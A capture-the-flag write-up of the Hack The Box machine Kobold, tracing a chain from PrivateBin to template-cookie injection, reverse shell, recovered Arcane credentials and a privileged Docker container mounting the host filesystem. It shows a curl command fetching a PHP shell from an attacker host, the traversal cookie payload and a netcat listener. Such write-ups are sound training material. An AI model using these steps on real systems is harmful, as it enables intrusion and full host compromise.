# Hack The Box — Kobold

## Overview

Kobold is a Linux machine where the attack path moves from web application enumeration to PHP template injection, credential recovery, access to the Arcane Docker management platform, and finally privilege escalation by creating a privileged Docker container with the host filesystem mounted.

The important part of this machine was understanding how several technologies connect:

PrivateBin → Template Injection → Arcane Credentials → Docker Administration → Privileged Container → Host Filesystem Mount → Root

---

# Initial Enumeration

An Nmap scan identified four important services:

| Port | Service |
|------|---------|
|22|SSH|
|80|HTTP|
|443|HTTPS|
|3552|Arcane|

Port **3552** hosted the Arcane Docker management interface.

Initial enumeration also identified the PrivateBin application.

---

# Local Enumeration

After obtaining access as the low-privileged user **ben**, I began searching for files belonging to interesting groups.

```bash
find / -group operator 2>/dev/null
```

Interesting directories included:

```text
/privatebin-data
/privatebin-data/certs
/privatebin-data/data
```

Listing the directory showed:

```bash
ls -la /privatebin-data
```

```text
certs/
cfg/
data/
```

The configuration directory (`cfg`) was inaccessible due to its permissions, but the `data` directory was writable.

While enumerating the contents, I also discovered the TLS certificate and private key used by the PrivateBin instance.

---

# PHP Template Injection

Because the `data` directory was writable, a PHP reverse shell was uploaded.

```bash
curl http://<KALI-IP>:1337/shell.php -o shell.php
```

The application used a cookie named:

```text
template
```

Changing the cookie to reference the uploaded PHP file caused the application to execute it.

```
Cookie:
template=../data/shell
```

Sending the request triggered the PHP reverse shell, resulting in remote code execution as the web server.

One issue encountered during testing was receiving repeated **400 Bad Request** responses. The problem was caused by sending an incomplete HTTP request in Burp Repeater. Once the request formatting and headers were corrected, the cookie was processed correctly and the shell executed.

---

# Reverse Shell

A Netcat listener was started:

```bash
nc -lvnp 9001
```

The reverse shell connected successfully.

Verifying the session showed:

```bash
id
```

The shell was running with the permissions of the web server.

---

# Credential Recovery

With code execution established, additional configuration files were inspected.

Sensitive credentials were recovered which provided access to the Arcane Docker management interface.

The recovered credentials successfully authenticated to:

```
http://kobold.htb:3552
```

---

# Arcane Docker Management

Arcane is a web-based Docker management platform.

After authentication, the dashboard displayed:

- Existing containers
- Docker images
- Networks
- Volumes
- Container creation options

The critical observation was that Arcane allowed authenticated administrators to create arbitrary Docker containers.

---

# Privilege Escalation

Rather than interacting with the existing container, a new container was created.

The container was configured with:

Image:

```
privatebin/nginx-fpm-alpine
```

Security:

```
Privileged Mode
Enabled
```

Host Mount:

```
Host:
/


Container:
/mount
```

This bind-mounted the host's root filesystem into the container.

Conceptually:

```
Host Filesystem
        │
        ▼
Container
   /mount
```

---

# Verifying Host Access

Opening the container shell showed:

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
```

Listing the mounted directory:

```bash
ls -la /mount
```

revealed the host's filesystem:

```text
boot
etc
home
opt
privatebin-data
root
usr
var
...
```

This confirmed that `/mount` represented the host operating system rather than the container itself.

---

# Root Access

Navigating into:

```bash
cd /mount/root
```

provided access to the host's root directory.

The root flag was successfully recovered from the mounted filesystem.

No Linux kernel exploit was required.

Instead, full host compromise resulted from abusing Docker's privileged container functionality.

---

# Attack Chain

```
Nmap Enumeration
        ↓
PrivateBin
        ↓
Writable Data Directory
        ↓
Upload PHP Reverse Shell
        ↓
Template Cookie Injection
        ↓
Remote Code Execution
        ↓
Recover Arcane Credentials
        ↓
Login to Arcane
        ↓
Create Privileged Docker Container
        ↓
Bind Mount Host Filesystem
        ↓
Root Inside Container
        ↓
Access /mount
        ↓
Host Root Filesystem
        ↓
Retrieve root.txt
```

---

# Key Takeaways

This machine demonstrated how multiple small weaknesses can combine into complete system compromise.

Important concepts reinforced included:

- Writable application directories can become code execution opportunities.
- Sensitive credentials stored in application files often enable lateral movement.
- Web-based Docker management platforms should be heavily restricted.
- Privileged Docker containers effectively remove the isolation normally provided by containers.
- Mounting the host's root filesystem (`/`) into a privileged container provides direct access to the host operating system.
- Verifying mounts using commands such as `mount`, `ls /mount`, and `id` is an important step before attempting privilege escalation.

The most valuable lesson from Kobold was understanding that compromising a Docker management interface is often equivalent to compromising the host itself when privileged containers and host bind mounts are permitted.
